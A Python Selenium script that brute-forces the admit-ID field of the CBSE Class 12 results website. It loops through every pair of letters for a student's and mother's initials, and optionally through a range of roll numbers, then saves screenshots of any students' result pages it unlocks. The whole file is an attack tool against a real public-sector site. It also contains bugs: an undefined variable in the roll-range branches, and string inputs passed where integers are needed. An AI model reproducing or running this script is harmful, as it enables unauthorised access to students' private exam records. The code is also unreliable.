from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

#String to test result occurrence
Text = 'Result Not Found'

#Alphabet dictionary for brute-force attacking student's initial and mother's initial 
Alphabet=('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')

#Input School and Centre Credentials
print("Enter school number: ")
SchoolNo = input()
print("Enter the centre number: ")
CentreNo = input()

#Input Student-unique credentials, if known
#Check for student's initial
print("Do you know student's name initial? (Y/N)")
StdFlag = input()
if StdFlag == 'Y': 
    print("Enter the student's first name initial: ")
    StdName = input()
#Check for mother's initial
print("Do you know student's mother's name initial? (Y/N)")
MotFlag = input()
if MotFlag == 'Y': 
    print("Enter the student's mother's first name initial: ")
    MotName = input()

#Check for student's roll number
print("Do you know student's exact roll number? (Y/N)")
RollFlag = input()
if RollFlag == 'Y': 
    print("Enter the student's roll number: ")
    RollNum = input()
else:
    print("Enter the range of roll numbers to check! ")
    print("Enter the lower limit roll number to check: ")
    LowRollNum = input()
    print("Enter the number of roll numbers to check: ")
    CountRollNum = input()

#Opens a browser window
browser = webdriver.Chrome('/chromedriver')

#Checks report if roll number is known
if RollFlag == 'Y':
    
    #Checks report if student's initial and mother's initial are known
    if StdFlag == 'Y' and MotFlag == 'Y':
        AdmitId = StdName + MotName + str(int(RollNum)%100).zfill(2) + str(SchoolNo)[:2] + str(int(CentreNo)%100)
                                                                           
        browser.get(('http://cbseresults.nic.in/class12-Revised/Class12th19_revised.htm'))
                                                                           
        regno = browser.find_element_by_name('regno')
        regno.send_keys(RollNum)
        sch = browser.find_element_by_name('sch')
        sch.send_keys(SchoolNo)
        cno = browser.find_element_by_name('cno')
        cno.send_keys(CentreNo)
        admid = browser.find_element_by_name('admid')
        admid.send_keys(AdmitId)
        submitButton = browser.find_element_by_name('B2')
        submitButton.click()

        if (Text not in browser.page_source):
            browser.save_screenshot("Results/"+ RollNum +" Report.png")
    
    #Checks report if student's initial is unknown and mother's initial is known
    elif StdFlag != 'Y' and MotFlag == 'Y':
        for alp in Alphabet:
            AdmitId = alp + MotName + str(int(RollNum)%100).zfill(2) + str(SchoolNo)[:2] + str(int(CentreNo)%100)
            
            browser.get(('http://cbseresults.nic.in/class12-Revised/Class12th19_revised.htm'))

            regno = browser.find_element_by_name('regno')
            regno.send_keys(RollNum)
            sch = browser.find_element_by_name('sch')
            sch.send_keys(SchoolNo)
            cno = browser.find_element_by_name('cno')
            cno.send_keys(CentreNo)
            admid = browser.find_element_by_name('admid')
            admid.send_keys(AdmitId)
            submitButton = browser.find_element_by_name('B2')
            submitButton.click()

            if (Text not in browser.page_source):
                browser.save_screenshot("Results/"+ RollNum +" Report.png")
    
    #Checks report if student's initial is known and mother's initial is unknown
    elif StdFlag == 'Y' and MotFlag != 'Y':
        for alp in Alphabet:
            AdmitId = StdName + alp + str(int(RollNum)%100).zfill(2) + str(SchoolNo)[:2] + str(int(CentreNo)%100)
            
            browser.get(('http://cbseresults.nic.in/class12-Revised/Class12th19_revised.htm'))
            
            regno = browser.find_element_by_name('regno')
            regno.send_keys(RollNum)
            sch = browser.find_element_by_name('sch')
            sch.send_keys(SchoolNo)
            cno = browser.find_element_by_name('cno')
            cno.send_keys(CentreNo)
            admid = browser.find_element_by_name('admid')
            admid.send_keys(AdmitId)
            submitButton = browser.find_element_by_name('B2')
            submitButton.click()

            if (Text not in browser.page_source):
                browser.save_screenshot("Results/"+ RollNum +" Report.png")
    
    #Checks report if student's initial and mother's initial are unknown
    elif StdFlag != 'Y' and MotFlag != 'Y':
        for alp in Alphabet:
            for bet in Alphabet:
                AdmitId = alp + bet + str(int(RollNum)%100).zfill(2) + str(SchoolNo)[:2] + str(int(CentreNo)%100)

                browser.get(('http://cbseresults.nic.in/class12-Revised/Class12th19_revised.htm'))

                regno = browser.find_element_by_name('regno')
                regno.send_keys(RollNum)
                sch = browser.find_element_by_name('sch')
                sch.send_keys(SchoolNo)
                cno = browser.find_element_by_name('cno')
                cno.send_keys(CentreNo)
                admid = browser.find_element_by_name('admid')
                admid.send_keys(AdmitId)
                submitButton = browser.find_element_by_name('B2')
                submitButton.click()

                if (Text not in browser.page_source):
                    browser.save_screenshot("Results/"+ RollNum +" Report.png")

#Checks report if roll number is unknown
else:
    
    #Checks report if student's initial and mother's initial are known
    if StdFlag == 'Y' and MotFlag == 'Y':
        for i in range(CountRollNum): 
            VarRollNum = LowRollNum + i
            AdmitId = StdName + MotName + str(int(VarRollNum)%100).zfill(2) + str(SchoolNo)[:2] + str(int(CentreNo)%100)

            browser.get(('http://cbseresults.nic.in/class12-Revised/Class12th19_revised.htm'))

            regno = browser.find_element_by_name('regno')
            regno.send_keys(RollNum)
            sch = browser.find_element_by_name('sch')
            sch.send_keys(SchoolNo)
            cno = browser.find_element_by_name('cno')
            cno.send_keys(CentreNo)
            admid = browser.find_element_by_name('admid')
            admid.send_keys(AdmitId)
            submitButton = browser.find_element_by_name('B2')
            submitButton.click()

            if (Text not in browser.page_source):
                browser.save_screenshot("Results/"+ VarRollNum +" Report.png")
    
    #Checks report if student's initial is unknown and mother's initial is known
    elif StdFlag != 'Y' and MotFlag == 'Y':
        for alp in Alphabet:
            for i in range(CountRollNum):
                VarRollNum = LowRollNum + i
                AdmitId = alp + MotName + str(int(VarRollNum)%100).zfill(2) + str(SchoolNo)[:2] + str(int(CentreNo)%100)

                browser.get(('http://cbseresults.nic.in/class12-Revised/Class12th19_revised.htm'))

                regno = browser.find_element_by_name('regno')
                regno.send_keys(RollNum)
                sch = browser.find_element_by_name('sch')
                sch.send_keys(SchoolNo)
                cno = browser.find_element_by_name('cno')
                cno.send_keys(CentreNo)
                admid = browser.find_element_by_name('admid')
                admid.send_keys(AdmitId)
                submitButton = browser.find_element_by_name('B2')
                submitButton.click()

                if (Text not in browser.page_source):
                    browser.save_screenshot("Results/"+ VarRollNum +" Report.png")
    
    #Checks report if student's initial is known and mother's initial is unknown
    elif StdFlag == 'Y' and MotFlag != 'Y':
        for alp in Alphabet:
            for i in range(CountRollNum):
                VarRollNum = LowRollNum + i
                AdmitId = StdName + alp + str(int(VarRollNum)%100).zfill(2) + str(SchoolNo)[:2] + str(int(CentreNo)%100)

                browser.get(('http://cbseresults.nic.in/class12-Revised/Class12th19_revised.htm'))

                regno = browser.find_element_by_name('regno')
                regno.send_keys(RollNum)
                sch = browser.find_element_by_name('sch')
                sch.send_keys(SchoolNo)
                cno = browser.find_element_by_name('cno')
                cno.send_keys(CentreNo)
                admid = browser.find_element_by_name('admid')
                admid.send_keys(AdmitId)
                submitButton = browser.find_element_by_name('B2')
                submitButton.click()

                if (Text not in browser.page_source):
                    browser.save_screenshot("Results/"+ VarRollNum +" Report.png")
    
    #Checks report if student's initial and mother's initial are unknown
    elif StdFlag != 'Y' and MotFlag != 'Y':
        for alp in Alphabet:
            for bet in Alphabet:
                for i in range(CountRollNum):
                    VarRollNum = LowRollNum + i
                    AdmitId = alp + bet + str(int(VarRollNum)%100).zfill(2) + str(SchoolNo)[:2] + str(int(CentreNo)%100)

                    browser.get(('http://cbseresults.nic.in/class12-Revised/Class12th19_revised.htm'))

                    regno = browser.find_element_by_name('regno')
                    regno.send_keys(RollNum)
                    sch = browser.find_element_by_name('sch')
                    sch.send_keys(SchoolNo)
                    cno = browser.find_element_by_name('cno')
                    cno.send_keys(CentreNo)
                    admid = browser.find_element_by_name('admid')
                    admid.send_keys(AdmitId)
                    submitButton = browser.find_element_by_name('B2')
                    submitButton.click()

                    if (Text not in browser.page_source):
                        browser.save_screenshot("Results/"+ VarRollNum +" Report.png")

#Closes browser window                        
browser.close()
